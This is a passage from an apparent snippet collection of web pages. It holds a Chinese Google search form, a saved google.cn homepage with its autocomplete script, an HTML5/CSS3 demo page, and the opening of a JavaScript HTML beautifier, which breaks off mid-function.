								<INPUT TYPE="button" value=" X " onclick="return _del('00X',0,'')">
							</td>
						</tr>
					</table>
				</h2>
				<div id=remote_00X style="border:1px;padding:1px;margin:0px;height:auto;overflow:hidden;">
					No Content
				</div>
			</TD>
		</TR>
	</TABLE>
<!-- inner module end -->
</div>
<!-- outer module end -->
#T=Google Search
<div id=sf width="100%">
				<table border="1" align=center width=100%>
					<tr>
						<form style="display:inline" id=sfrm name=f method=GET action="http://www.google.com/search">
							<td valign=top>
								<table border="1" width="100%">
									<tr>
										<td height=14 valign=bottom>
											<div id=tabs>
											<script>
												<!--
												function qs(el)
												{
													if (window.RegExp && window.encodeURIComponent)
													{
														var ue=el.href;
														var qe=encodeURIComponent(document.f.q.value);
														if(ue.indexOf("q=")!=-1)
														{
															el.href=ue.replace(new RegExp("q=[^&$]*"),"q="+qe);
														}
														else
														{
															el.href=ue+"&q="+qe;
														}
													}
													return 1;
												}
												// -->
											</script>
											<table border="1" width="100%">
												<tr>
													<td nowrap>
														<font size=-1>
															<b>
																网页
															</b>
															
															<a id=1a class=q href="http://www.google.com/imghp?hl=zh-CN&tab=wi" onClick="return qs(this);">
																图片</a>
														
															<a id=2a class=q href="http://news.google.com/nwshp?hl=zh-CN&tab=wn" onClick="return qs(this);">
																资讯</a>
															
															<a id=5a class=q href="http://groups.google.com/grphp?hl=zh-CN&tab=wg" onClick="return qs(this);">
																论坛</a>
															
															<a id=11a class=q href="http://www.google.com/dirhp?hl=zh-CN&tab=wd" onClick="return qs(this);">
																网页目录</a>
															
															<b>
																<a href="http://www.google.com/intl/zh-CN/options/" class=q>
																	更多&raquo;</a>
															</b>
														</font>
													</td>
												</tr>
											</table>
										</div>
									</td>
								</tr>
								<tr>
									<td valign=top>
										<table border="1" width="100%">

											<tr>
												<td nowrap align=center>
													<div id=sbox>
														<input type=hidden name=hl id=hl value="zh-CN">
														<input type=text name=q id=q maxlength=2048 value="">
													</div>
													<div style="display:inline" id=btng>
														<input type=submit value="搜索" name=btnG>
													</div>
													<div style="display:inline" id=btni>
														<input type=submit value="手气不错" name=btnI>
													</div>
												</td>
												<td nowrap valign=top >
													<font size=-2>
														<div id=as>
															
															<a href=/advanced_search?hl=zh-CN>
																高级搜索
															</a>
														</div>
														<div id=prefs>
															
															<a href=/preferences?hl=zh-CN>
																使用偏好
															</a>
														</div>
														<div id=lgt>
															
															<a href=/language_tools?hl=zh-CN>
																语言工具
															</a>
														</div>
													</font>
												</td>

											</tr>
										</table>
									</td>
								</tr>
							</table>
						</td>

					</tr>
					<tr>
						<td colspan=3 align=left>
							<font size=-1>
								<input id=all type=radio name=lr value="" checked>
								<label for=all>
									搜索所有网页
								</label>
								<br>
								<input id=ch type=radio name=lr value=lang_zh-CN|lang_zh-TW>
								<label for=ch>
									搜索所有中文网页
								</label>
								<br>
								<input id=il type=radio name=lr value=lang_zh-CN>
								<label for=il>
									搜索简体中文网页
								</label>
							</font>
						</td>
					</tr>
				</table>
				<div id=promo>
				</div>
			</form>
		</div>
#T=Google.cn
<html>
	<head>
		<meta http-equiv="content-type" content="text/html; charset=UTF-8">
		<title>
			Google
		</title>

<BASE href="http://www.google.cn">
<script>
window.google={kEI:"Tx9GSMGyMovU6gPdxZzsBw",kEXPI:"17259,17735",kHL:"zh-CN"};
function sf()
{
	document.f.q.focus()
}
window.clk = function(b,c,d,e,f,g)
				{
					if (document.images)
					{
						var a=encodeURIComponent||escape;
						(new Image).src="/url?sa=T"+(c?"&oi="+a(c):"")+(d?"&cad="+a(d):"")+"&ct="+a(e)+"&cd="+a(f)+(b?"&url="+a(b.replace(/#.*/,"")).replace(/\+/g,"%2B"):"")+"&ei=Tx9GSMGyMovU6gPdxZzsBw"+g
					}
					return true
				};
window.navExtra = [];
window.navAdd = function(a,d)
{
	if (typeof a == "string")
	{
	var c=document,b=c.createElement("a");
	b.href=d;
	b.appendChild(c.createTextNode(a));
	a = b
	}
	window.navExtra[window.navExtra.length] = a
};
(
	function ()
	{
		var c = document.getElementById("trlc"),b = c.getElementsByTagName("a");
		for (var a = 0; a < b.length; a++)
		{
			window.navAdd(b[a])
		}
	}
)();
window.gbar = {};
(
	function ()
	{
		var c = window.gbar,e,g,h;
		c.qs = function (b)
					{
						var d = window.encodeURIComponent&&(document.forms[0].q||"").value;
						if (d)
						{
							b.href = b.href.replace
												(
													/([?&])q=[^&]*|$/
													, function (f,a)
														{
															return (a||"&") + "q=" + encodeURIComponent(d)
														}
												)
						}
					};
		function n(b,d,f)
		{
			b.visibility = h ? "hidden" : "visible";
			b.left = d + "px";
			b.top = f+"px"
		}
		c.tg = function (b)
		{
			var d=0,f=0,a,i=0,o,l = window.navExtra,m,j=document,k=0;
			g = g||j.getElementById("gbar").getElementsByTagName("span");
			(b || window.event).cancelBubble=!i;
			if (!e)
			{
				e = j.createElement(Array.every||window.createPopup?"iframe":"DIV");
				e.frameBorder = "0";
				e.scrolling="no";
				e.src = "#";
				g[7].parentNode.appendChild(e).id="gbi";
				if(l&&g[7])
				{
					for(o in l)
					{
						m = j.createElement("span");
						m.appendChild(l[o]);
						g[7].parentNode.insertBefore(m,g[7]).className = "gb2"
					}
					j.onclick = c.close
				}
			}
			while (a =g[++i])
			{
				if (f)
				{
					n(a.style,f+1,d+25);
					{
						d+=9;
						if(!(a.firstChild.tagName=="DIV"))
						{
							d += 11;
							k = Math.max(k,a.offsetWidth)
						}
					}
				}
				if(a.className=="gb3")
				{
					do f+=a.offsetLeft;
					while(a=a.offsetParent)
				}
			}
			{
				i=0;
				while(a=g[++i])if(a.className=="gb2")a.style.width=k+"px";e.style.width=k+"px"
			}e.style.height = d+"px";
			n(e.style,f,24);h=!h};
			c.close = function(b)
						{
							h&&c.tg(b)
						}
		}
	)();
	</script>
	</head>
	<body>
	<script type="text/javascript" language="javascript">
	(function(){
function g(a,b,c){var d="on"+b;if(a.addEventListener){a.addEventListener(b,c,false)}else if(a.attachEvent){a.attachEvent(d,c)}else{var e=a[d];a[d]=function(){var f=e.apply(this,arguments),h=c.apply(this,arguments);return f==undefined?h:(h==undefined?f:h&&f)}}};var aa,i,j,l,n="",o,p=null,q=null,r=null,s=-1,t,u,v,w,x=null,y=null,z,A,ba={},B=null,C,F=0,G=0,H=0,I=null,J,K=false,L=false,M,N;{var ca=navigator.userAgent.toLowerCase();M=ca.indexOf("opera")!=-1;N=ca.indexOf("msie")!=-1&&!M}var O=null,da=new RegExp("^[\\s\\u1100-\\u11FF\\u3040-\\u30FF\\u3130-\\u318F\\u31F0-\\u31FF\\u3400-\\u4DBF\\u4E00-\\u9FFF\\uAC00-\\uD7A3\\uF900-\\uFAFF\\uFF65-\\uFFDC]+$"),P="google-ac-",ea=true;function fa(a,b,c,d,e,f,h,m){t=a;u=b;aa=d;O=e;ea=f;if(ga()==null){return}var k=window.google.kHL;
J=/^(zh-(CN|TW)|ja|ko)$/.test(k);if(c=="search")c="";C="/complete/search?hl="+k+(c?"&ds="+c:"")+(m?"&pq="+ha(m):"")+(h?"&expid="+h:"")+"&client=suggest";t.onsubmit=ia;u.setAttribute("autocomplete","off");g(u,"blur",ja);g(u,"beforedeactivate",ka);if(u.addEventListener){u.onkeypress=la;u.onkeyup=na}else{g(u,N?"keydown":"keypress",la);g(u,"keyup",na)}j=(l=(i=u.value));o=oa(u);v=document.createElement("table");v.id="completeTable";v.cellSpacing=(v.cellPadding="0");w=v.style;v.className=P+"m";Q();document.body.appendChild(v);
if(N){x=document.createElement("iframe");y=x.style;x.id="completeIFrame";y.zIndex="1";y.position="absolute";y.display="block";y.borderWidth=0;document.body.appendChild(x)}R();pa("",[],[]);qa();g(window,"resize",R);g(window,"pageshow",ra);if(J)window.setInterval(sa,10);z=ta("aq","f",false);A=ta("oq","",true);S()}function ra(a){if(a.persisted)z.value="f";A.value=""}function qa(){var a=document.body.dir=="rtl",b=a?"right":"left",c=a?"left":"right",d=document.getElementsByTagName("head")[0],e=document.createElement("style"),
f=null,h=null,m=false;if(document.styleSheets){d.appendChild(e);m=true;f=e.sheet?e.sheet:e.styleSheet}if(!f){h=document.createTextNode("");e.appendChild(h)}var k=function(D,E){var ma=D+" { "+E+" }";if(f){if(f.insertRule){f.insertRule(ma,f.cssRules.length)}else if(f.addRule){f.addRule(D,E)}}else{h.data+=ma+"\n"}};k("."+P+"m","font-size:13px;font-family:arial,sans-serif;cursor:default;line-height:17px;border:1px solid black;z-index:99;position:absolute;background-color:white;margin:0;");k("."+P+"a",
"background-color:white;");k("."+P+"b","background-color:#36c;color:white;");k("."+P+"c","white-space:nowrap;overflow:hidden;text-align:"+b+";padding-"+b+":3px;"+(N||M?"padding-bottom:1px;":""));k("."+P+"d","white-space:nowrap;overflow:hidden;font-size:10px;text-align:"+c+";color:green;padding-"+b+":3px;padding-"+c+":3px;");k("."+P+"b td","color:white;");k("."+P+"e td","padding:0 3px 2px;text-align:"+c+";font-size:10px;line-height:15px;");k("."+P+"e td","color:blue;text-decoration:underline;cursor:pointer;");
if(!m)d.appendChild(e)}function R(){if(v){w.left=ua(u,"offsetLeft")+"px";w.top=ua(u,"offsetTop")+u.offsetHeight-1+"px";w.width=u.offsetWidth+"px";if(x){y.left=w.left;y.top=w.top;y.width=w.width;y.height=v.offsetHeight+"px"}}}function T(a,b){a.visibility=b?"visible":"hidden"}function ta(a,b,c){var d=document.createElement("input");d.type="hidden";d.name=a;d.value=b;d.disabled=c;t.appendChild(d);return d}function ja(){if(!K)Q();K=false}function ka(){if(K){window.event.cancelBubble=true;window.event.returnValue=
false}K=false}function la(a){var b=a.keyCode;if(b==27&&va()){Q();U(j);a.cancelBubble=true;a.returnValue=false;return false}if(!V(b))return true;H++;if(H%3==1)W(b);return false}function na(a){var b=a.keyCode;if(!(J&&V(b))&&H==0)W(b);H=0;return!V(b)}function W(a){if(J&&V(a))wa();if(u.value!=i||a==39){j=u.value;o=oa(u);if(a!=39)A.value=j}if(xa(a)){ya(s+1)}else if(za(a)){ya(s-1)}R();if(n!=j&&!I)I=window.setTimeout(Q,500);i=u.value;if(i==""&&!p)S()}function za(a){return a==38||a==63232}function xa(a){return a==
40||a==63233}function V(a){return za(a)||xa(a)}function Aa(){u.blur();z.value=""+s;U(this.completeString);if(ea){if(ia()){t.submit()}}else{Q()}}function Ba(){if(L)return;if(r)r.className=P+"a";this.className=P+"b";r=this;for(var a=0;a<q.length;a++){if(q[a]==r){s=a;break}}}function Ca(){if(L){L=false;Ba.call(this)}}function ya(a){if(n==""&&j!=""){l="";S();return}if(j!=n||!p)return;if(!q||q.length<=0)return;if(!va()){X();return}var b=q.length;if(O)b-=1;if(r)r.className=P+"a";if(a==b||a==-1){s=-1;U(j);
Y();z.value="f";return}else if(a>b){a=0}else if(a<-1){a=b-1}z.value=""+a;s=a;r=q.item(a);r.className=P+"b";U(r.completeString)}function Q(){if(I){window.clearTimeout(I);I=null}T(w,false);if(x)T(y,false)}function X(){T(w,true);if(x)T(y,true);R();L=true}function va(){return w.visibility=="visible"}function Da(a,b,c){if(c.length==0||c[0]<2)return;var d=[],e=[],f=c[0],h=Math.floor((c.length-1)/f);for(var m=0;m<h;m++){d.push(c[m*f+1]);e.push(c[m*f+2])}Z(a,b,d,e)}function Z(a,b,c,d){if(F>0)F--;pa(b,c,d);
if(b!=j)return;if(I){window.clearTimeout(I);I=null}n=b;Ea(v,c,d);s=-1;q=v.rows;if(q.length>0){X()}else{Q()}}function Fa(a){var b;a.unshift(b);if(a.length>=3){if(a.length<4)a.push([])}Z.apply(null,a)}function pa(a,b,c){ba[a]=[b,c]}function ia(){Q();A.disabled=true;if(A.value!=u.value){z.value=""+s;A.disabled=false}else if(G>=3||F>=10){z.value="o"}return true}function S(){if(G>=3)return false;if(l!=j){var a=ha(j),b=ba[j];if(b){Z(null,j,b[0],b[1])}else{F++;if(aa){var c=document.createElement("script");
c.setAttribute("type","text/javascript");c.setAttribute("charset","utf-8");c.setAttribute("id","jsonpACScriptTag");c.setAttribute("src","http://suggestqueries.google.com"+C+"&json=t&jsonp=window.google.ac.jsonRPCDone&q="+a+"&cp="+o);var d=document.getElementById("jsonpACScriptTag"),e=document.getElementsByTagName("head")[0];if(d){e.removeChild(d)}e.appendChild(c)}else{Ga(a)}}Y()}l=j;var f=100;for(var h=1;h<=(F-2)/2;++h){f*=2}f+=50;p=window.setTimeout(S,f);return true}function ha(a){if(window.encodeURIComponent)return encodeURIComponent(a);
return escape(a)}function U(a){u.value=a;i=a}function Y(){u.focus()}function ua(a,b){var c=0;while(a){c+=a[b];a=a.offsetParent}return c}function $(a,b){a.appendChild(document.createTextNode(b))}function Ea(a,b,c){while(a.rows.length>0)a.deleteRow(-1);for(var d=0;d<b.length;++d){var e=a.insertRow(-1);e.onmousedown=Aa;e.onmouseover=Ba;e.onmousemove=Ca;e.completeString=b[d];e.className=P+"a";var f=document.createElement("td");$(f,b[d]);f.className=P+"c";if(N&&da.test(b[d]))f.style.paddingTop="2px";e.appendChild(f);
var h=document.createElement("td");$(h,c[d]);h.className=P+"d";e.appendChild(h)}if(O&&b.length>0){var m=a.insertRow(-1);m.onmousedown=function(E){if(E&&E.stopPropagation){E.stopPropagation();X();u.focus()}else{K=true}return false};var k=document.createElement("td");k.colSpan=2;m.className=P+"e";var D=document.createElement("span");m.appendChild(k);k.appendChild(D);$(D,O);D.onclick=function(){Q();n="";window.clearTimeout(p);p=null;z.value="x"}}}function ga(){var a=null;try{a=new ActiveXObject("Msxml2.XMLHTTP")}catch(b){try{a=
new ActiveXObject("Microsoft.XMLHTTP")}catch(c){a=null}}if(!a&&typeof XMLHttpRequest!="undefined")a=new XMLHttpRequest;return a}function Ga(a){if(B&&B.readyState!=0&&B.readyState!=4){B.abort()}if(B)B.onreadystatechange=Ha;B=ga();if(B){B.open("GET",C+"&js=true&q="+a+"&cp="+o,true);B.onreadystatechange=function(){if(B.readyState==4&&B.responseText){switch(B.status){case 403:G=1000;break;case 302:case 500:case 502:case 503:G++;break;case 200:var b=B.responseText;if(b.charAt(0)!="<"&&(b.indexOf("sendRPCDone")!=
-1||b.indexOf("Suggest_apply")!=-1)){eval(b)}else{F--}default:G=0}}};B.send(null)}}function Ha(){}function sa(){var a=u.value;if(a!=i)W(0);i=a}function wa(){K=true;u.blur();window.setTimeout(Y,10)}function oa(a){var b=0,c=0;if(Ia(a)){b=a.selectionStart;c=a.selectionEnd}if(N){var d=a.createTextRange(),e=document.selection.createRange();if(d.inRange(e)){d.setEndPoint("EndToStart",e);b=d.text.length;d.setEndPoint("EndToEnd",e);c=d.text.length}}if(b&&c&&b==c)return b;return 0}function Ia(a){try{return typeof a.selectionStart==
"number"}catch(b){return false}}window.google.ac={install:fa,Suggest_apply:Da,jsonRPCDone:Fa,setFieldValue:U};
})();
(function(){
function k(c,d,b){var a="on"+d;if(c.addEventListener)c.addEventListener(d,b,false);else if(c.attachEvent)c.attachEvent(a,b);else{var f=c[a];c[a]=function(){var g=f.apply(this,arguments),e=b.apply(this,arguments);return g==undefined?e:(e==undefined?g:e&&g)}}};var l="/intl/zh-CN/images/toolbar_animation_20080526.png",m=52,n=37,o=75,p=100;function q(c,d,b,a,f){return{url:c,name:d,tooltip:b,color:a,yAdjust:f}}var r=[q("http://video.google.cn/","<font size=-1>\u89c6\u9891</font>","\u641c\u7d22\u70ed\u95e8\u7f51\u7edc\u89c6\u9891","#54a70d",[2,5]),q("http://images.google.cn/","<font size=-1>\u56fe\u7247</font>","\u641c\u7d22\u5168\u7403\u7684\u56fe\u7247","#3b79e7",[2,5]),q("http://news.google.cn/","<font size=-1>\u8d44\u8baf</font>","\u8ddf\u8e2a\u793e\u4f1a\u70ed\u70b9\uff0c\u641c\u7d22\u6700\u65b0\u8d44\u8baf",
"#f3e76e",[3,7]),q("http://ditu.google.cn/","<font size=-1>\u5730\u56fe</font>","\u67e5\u8be2\u5730\u5740\u3001\u635c\u7d22\u5468\u8fb9\u548c\u89c4\u5212\u8def\u7ebf","#96cfec",[4,9]),q("http://finance.google.cn/",'<font size=-1>\u8d22\u7ecf</font><font size=-1><sup style="color:red;text-decoration:none">\u65b0!</sup></font>',"\u5546\u4e1a\u4fe1\u606f\u3001\u8d22\u7ecf\u65b0\u95fb\u3001\u5b9e\u65f6\u80a1\u4ef7\u548c\u52a8\u6001\u56fe\u8868","#54c77a",[3,7]),q("http://www.google.cn/rebang/","<font size=-1>\u70ed\u699c</font>",
"\u67e5\u770b\u5206\u7c7b\u70ed\u95e8\u641c\u7d22\u6392\u884c","#ff9202",[2,5]),q("http://daohang.google.cn/","<font size=-1>\u7f51\u7ad9\u5bfc\u822a</font>","\u7f51\u5740\u5927\u5168\uff0c\u5feb\u901f\u76f4\u8fbe\u5e38\u7528\u7f51\u7ad9","#d93c08",[2,5])],s=[];function t(c,d){while(d&&c!=d)d=d.parentNode;return d==c}function v(c,d){return function(b){b=b||window.event;var a=s[d],f=c=="mouseover",g=b.target||b.srcElement,e=b.relatedTarget||(f?b.fromElement:b.toElement),h=!e||t(a.element,e),i=t(a.element,
g);if(f&&!h||!f&&(!e||i&&!h)){var j=a.icon;j.mouseTimeout=window.clearTimeout(j.mouseTimeout);var u=f?1:-1;if(j.b!=u)j.mouseTimeout=window.setTimeout(j.e(u,undefined),f?p/3:p)}}}function w(c,d,b){k(c,d,v(d,b))}function x(c,d,b){this.c=c;var a=document.createElement("div"),f=c.color,g="background-color:"+f,e="width:1px;height:1px;"+g+";float:",h='<div style="height:1px;overflow:hidden"><div style="'+e+'left"></div><div style="'+e+'right"></div></div>',i="margin:0 1px;height:1px;overflow:hidden;"+g;
a.innerHTML='<div style="display:none;position:absolute;top:0;left:0;z-index:2;background:#fff;cursor:pointer;cursor:hand"><a href="'+d+'" style="color:#444;text-decoration:none" target=_blank><div style="'+i+'"></div><div style="text-align:center;border-left:1px solid;border-right:1px solid;border-color:'+f+'">'+h+'<div style="margin:0 auto;white-space:nowrap;padding:.2em 0 0"><font size=-1><span>'+b+"</span></font></div>"+h+'</div><div style="'+i+'"></div><div style="height:4px" align="center"><div style="position:relative;top:-1px;z-index:3;width:8px;overflow:hidden;margin:0 auto;height:4px;background:no-repeat -260px '+
-c.spriteCoordinateList[0].y+'px"></div></div></a></div>';this.h=a.getElementsByTagName("span")[0];document.body.appendChild(a);a.firstChild.firstChild.lastChild.firstChild.style.backgroundImage="url("+l+")";this.element=a.firstChild;var j=s.length;s.push({icon:c,element:this.element});w(this.element,"mouseover",j);w(this.element,"mouseout",j)}x.prototype.play=function(c){var d=this.c.element.firstChild,b={left:-d.offsetLeft,top:0};while(d){b.left+=d.offsetLeft;b.top+=d.offsetTop;d=d.offsetParent}var a=
this.element.style;if(a.display=="none"){a.visibility="hidden";a.display="block"}var f=this.element.offsetHeight,g=this.h.offsetWidth+14;if(a.visibility=="hidden"){a.display="none";a.visibility="visible"}a.width=g+"px";b.left-=(g-this.c.element.parentNode.offsetWidth)/2;b.top-=f-3;b.top+=20*Math.pow(1-c/this.c.frames,3);a.left=b.left+"px";a.top=b.top+"px";if(c==0||this.c.b<0)a.display="none";else{a.display="";var e=c/this.c.frames;if("opacity"in a)a.opacity=e;else if("MozOpacity"in a)a.MozOpacity=
e;else if("KhtmlOpacity"in a)a.KhtmlOpacity=e;else if("filter"in a)a.filter="alpha(opacity="+e*100+")"}};function y(c,d,b,a,f){this.element=c;this.mouseTimeout=null;this.frames=d.length-1;this.spriteCoordinateList=d;this.color=b;this.d=null;this.g=c.getElementsByTagName("div")[1];this.i=new x(this,a,f);this.b=-1;this.a=1;var g=s.length;s.push({icon:this,element:c});w(c,"mouseover",g);w(c,"mouseout",g)}y.prototype.e=function(c,d){var b=this;return function(){b.f(c,d)}};y.prototype.f=function(c,d){if(c){this.b=
c;this.mouseTimeout=window.clearTimeout(this.mouseTimeout);this.d=window.clearTimeout(this.d)}if(typeof d!="undefined")this.a=d;var b=this.spriteCoordinateList[this.a];this.g.style.backgroundPosition=-b.x+"px "+-b.y+"px";this.i.play(this.a);var a=this.element.getElementsByTagName("font")[0].style;if(this.b<0){a.color="#444";a.textDecoration="none"}else{a.color=this.color;a.textDecoration="underline"}this.a+=this.b;if(this.a>this.frames)this.a=this.frames-1;else if(this.a<0)this.a=1;else this.d=window.setTimeout(this.e(undefined,
undefined),o)};k(window,"load",function(){try{document.execCommand("BackgroundImageCache",false,true)}catch(c){}var d='<table style="margin:2em auto;border-collapse:collapse;line-height:1.4em" cellpadding="3" cellspacing="2" border="0"><tr>';for(var b=0;b<r.length;++b){var a=r[b];a.url="/url?ct=pro&cd="+b+"&source=cwh&q="+encodeURIComponent(a.url);var f=[],g=n*b;for(var e=0;e<7;++e)if(e>4)f.push({x:m*4,y:g-a.yAdjust[e-5]});else f.push({x:m*e,y:g});a.coordinates=f;d+='<td valign=bottom style="text-align:center;padding:0 .35em 0 .4em;margin:0;cursor:pointer;cursor:hand"><a style="color:#444;text-decoration:none;vertical-align:bottom" href="'+
a.url+'" target=_blank><div><div style="width:52px;height:37px;margin:.5em auto;cursor:pointer;cursor:hand;background:no-repeat 0 '+-g+'px"></div><span style="white-space:nowrap">'+a.name+"</span></div></a></td>"}d+="</tr></table>";var h=document.getElementById("tb");h.innerHTML=d;var i=h.getElementsByTagName("a");for(var b=0;b<i.length;++b){i[b].firstChild.firstChild.style.backgroundImage="url("+l+")";new y(i[b],r[b].coordinates,r[b].color,r[b].url,r[b].tooltip)}});
})();
</script>
	
	<div id="tb"></div>
	</body>
	<script>window.setTimeout('window.google.ac.install(document.f,document.f.q,"",false,"关闭",true,"","")',100);</script></html>
#T=html5
<!doctype html>
<html lang="zh">
	<head>
		<meta charset="utf-8" />
		<title>HTML5</title>
		<link rel="stylesheet" href="styles.css" />
		<!--[if IE]>
		<script src="http://html5shiv.googlecode.com/svn/trunk/html5.js"></script>
		<script src="http://html5media.googlecode.com/svn/trunk/src/html5media.min.js"></script>
		<![endif]-->
		
		<style type="text/css">
			* {
				font-family: Lucida Sans, Arial, Helvetica, sans-serif;
			}
			body {
				width: 960px; margin: 0px auto;
			}
			header h1 {
				font-size: 36px; margin: 0px;
			}
			header h2 {
				font-size: 18px; margin: 0px; color: #888;
				font-style: italic;
			}
			nav ul {
				list-style: none; padding: 0px; display: block;
				clear: right; background-color: #666;
				padding-left: 4px; height: 24px;
			}
			nav ul li {
				display: inline; padding: 0px 20px 5px 10px;
				height: 24px; border-right: 1px solid #ccc;
			}
			nav ul li a {
				color: #EFD3D3; text-decoration: none;
				font-size: 13px; font-weight: bold;
			}
			nav ul li a:hover {
				color: #fff;
			}
			article > header time {
				font-size: 14px; display: block; width: 26px;
				padding: 2px; text-align: center; background-color: #993333;
				color: #fff; font-weight: bold; -moz-border-radius: 6px;
				-webkit-border-radius: 6px; border-radius: 6px; float: left;
				margin-bottom: 10px;
			}
			article > header time span {
				font-size: 10px; font-weight: normal;
				text-transform: uppercase;
			}
			article > header h1 {
				font-size: 20px; float: left;
				margin-left: 14px; text-shadow: 2px 2px 5px #333;
			}
			article > header h1 a {
				color: #993333;
			}
			article > section header h1 {
				font-size: 16px;
			}
			article p {
				clear: both;
			}
			footer p {
				text-align: center; font-size: 12px;
				color: #888; margin-top: 24px;
			}
			article > section video {
				width: 480px; height: 200px;
				text-align: center;
			}
			article > section div.no-html5-video,
			article > section div#no-canvas {
				width: 960px; height: 40px; border: 1px solid #993333;
				text-align: center; color: #993333; font-size: 13px;
				font-style: italic; background-color: #F7E9E9;
			}
			article > section form {
				border: 1px solid #888;
				-moz-border-radius: 10px;
				-webkit-border-radius: 10px;
				border-radius: 10px;	
				-moz-box-shadow: 10px 10px 5px #888;
				-webkit-box-shadow: 10px 10px 5px #888;
				box-shadow: 10px 10px 5px #888;
				background-color: #eee;
				padding: 10px; margin-bottom: 30px;
			}
			article > section label {
				font-weight: bold; font-size: 13px;
			}
			article > section input {
				margin-bottom: 3px; font-size: 13px;
			}
			article > section div#no-canvas {
				display: none;
			}
			canvas {
				border: 1px solid #888;
				-moz-border-radius: 10px;
				-webkit-border-radius: 10px;
				border-radius: 10px;	
				-moz-box-shadow: 10px 10px 5px #888;
				-webkit-box-shadow: 10px 10px 5px #888;
				box-shadow: 10px 10px 5px #888;
				background-color: #eee;
			}
		</style>
	</head>
	<body>
	<header>
		<hgroup>
			<h1>Company Name</h1>
			<h2>An example of HTML5 and CSS3 in action</h2>
		</hgroup>
	</header>
	<nav>
		<ul>
			<li><a href="#">Home</a></li>
			<li><a href="#">About Us</a></li>
			<li><a href="#">Contact Us</a></li>
		</ul>
	</nav>
	<article>
		<header>
			<time datetime="2010-01-12" pubdate="pubdate">
				<span>Jan</span>  12
			</time>
			<h1>
				<a href="#" title="Link to this post" rel="bookmark">Article Heading</a>
			</h1>
		</header>
		<p contenteditable="true">可编辑内容 : This is an article that demonstrates some of the new features that HTML5 and CSS3 has to offer. This article contains several sections, each with its own heading, as well as a video element which will play a video without Flash on browsers that support it.</p>
		<section>
			<header>
				<h1>This is a section including video</h1>
			</header>
			<p>
				<video controls="controls" >
					<source src="http://www.double.co.nz/video_test/transformers480.ogg" type="video/ogg; codecs='vorbis, theora'"/>
					<div class="no-html5-video">
						<p>This video will work in Mozilla Firefox or Google Chrome only. <a href="http://www.double.co.nz/video_test/transformers480.ogg">Download video file.</a>
						</p>
					</div>
				</video>
			</p>
			<p>This is an example of a basic section of a document. A section can refer to different parts of a document, application, or page. According to the draft W3C spec, HTML5 sections usually have headings.
			</p>
		</section>
		<section>
			<header>
				<h1>这部分是反馈表</h1>
			</header>
			<p><form>
				<label for="contact_name">姓名</label>
				<input id="contact_name" required="required" placeholder="请输入您的姓名" autofocus="autofocus" /><br />
				<label for="contact_email">电邮</label>
				<input type="email" id="contact_email" placeholder="Email Address" /><br />			
				<label for="contact_phone">电话</label>
				<input type="tel" id="contact_phone" required="required" pattern="[0-9]{6,12}" placeholder="6到12位数字" /><br />
				<label for="contact_callback">回拨时间</label>			
				<input type="datetime" id="contact_callback" value="2011-06-18T08:36:35.682Z" size="30"/><br />
				<label for="contact_priority">优先级</label>
				<input type="range" min="1" max="5" step="1" value="1"  id="contact_priority" />
				<output id="contact_priority_result" >1</output>
				<br /><br />
				<input type="submit" value="请求回拨" />
			</form></p>
			<style type="text/css">
				input[type=range] { background-color: #eee; vertical-align: middle; }
				input[type=range]:before { content: attr(min); padding-right: 5px; }
				input[type=range]:after { content: attr(max); padding-left: 5px;}
			</style>
			<script>
				(function() {
					try{
						contact_priority = document.getElementById('contact_priority');
						contact_priority_result = document.getElementById('contact_priority_result');
						// 滑动时显示选择的值
						contact_priority.addEventListener("change", function() {
							contact_priority_result.value = contact_priority.value;
						}, false);
					}catch(e){
					}
				})();
			
			</script>
		</section>
		<section>
			<header>
				<h1>This is an 2D Canvas section</h1>
			</header>
			<p>
				<canvas id="my_canvas" width="960" height="320"></canvas>
				<div id="no-canvas">
					<p>You need a Canvas-compatible browser to view this area.</p>
				</div>
			</p>
			<script>
			(function() {
				function loadCanvas() {
					try{
						var canvas = document.getElementById('my_canvas');
						if(canvas.getContext) {
							var ctx = canvas.getContext('2d');
							ctx.beginPath();
							ctx.arc(245,160,150,0,Math.PI*2,true);
							ctx.fillStyle = "rgb(255,255,204)";
							ctx.fill();
							ctx.stroke();
							ctx.fillStyle = "black";
							ctx.beginPath();
							ctx.arc(200,110,15,0,Math.PI*2,true);
							ctx.fill();
							ctx.beginPath();
							ctx.arc(280,110,15,0,Math.PI*2,true);
							ctx.fill();
							ctx.beginPath();
							ctx.arc(240,170,20,4,Math.PI*2,true);
							ctx.stroke();
							ctx.beginPath();
							ctx.arc(240,190,60,0,Math.PI,false);
							ctx.stroke();
						} else {
							document.getElementById('my_canvas').style.display = 'none';
							document.getElementById('no-canvas').style.display = 'block';
						}
					}catch(e){
						alert('canvas is not supported by this browser. ' + e);
					}
				}
				window.onload = loadCanvas;
			})();
			</script>
		</section>
	</article>
	<footer>
		<p>&copy; 2011 Company Name. All rights reserved.</p>
	</footer>
	</body>
</html>
#T=HtmlBeautify jeditor2
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8"/>
    <title>自己实现HTML-Beautify</title>
   
    <script src="jquery-1.3.2.js" type="text/javascript"></script>

 
    <script type="text/javascript">

        // 我在Html Beautifier的一个尝试
        function HtmlBeautify(source, indent_value) {
            this.source = source;
            this.indent_value = indent_value;
            this.result = "";

            this.parse();
        }

        // 分析并产生输出到this.result
        HtmlBeautify.prototype.parse = function() {
            var that = this;
            // 当前分析到哪个字符，当前标记值，标记类型，输出数组，缩进级别
            var pos = 0, token_value = "", token_type = "",
            output = [], indent_level = 0;

            // 把这些标签作为Single Tag
            var single_token = "br,input,link,meta,!doctype,basefont,base,area,hr,wbr,param,img,isindex,?xml,embed".split(',');

            // 输出当前标记（换行+缩进量+标记值）
            function outputToken() {
                output.push("\n");
                for (var i = 0; i < indent_level; i++) {
                    output.push(that.indent_value);
                }
                output.push(token_value);
            }

            // 获取下一个标记（首先获取正文，如果正文为空则获取标签）
            function nextToken() {
                var token_value_array = [], val = "";

                // "<"之前的所有内容作为正文标签
                while ((val = that.source[pos]) !== "<") {
                    if (pos >= that.source.length) {
                        token_type = "END";
                        return;
                    }

                    token_value_array.push(val);
                    pos++;
                }

                token_value = $.trim(token_value_array.join(""));
                if (token_value === "") {
                    // 如果正文标记为空，则获取标签标记
                    nextTokenTag();
                } else {
                    token_type = "CONTENT";
                }
            }

            function nextTokenTag() {
                var token_value_array = [], val = "", tagName = "";

                // 获取标签标记，直到遇到">"
                do {
                    val = that.source[pos];
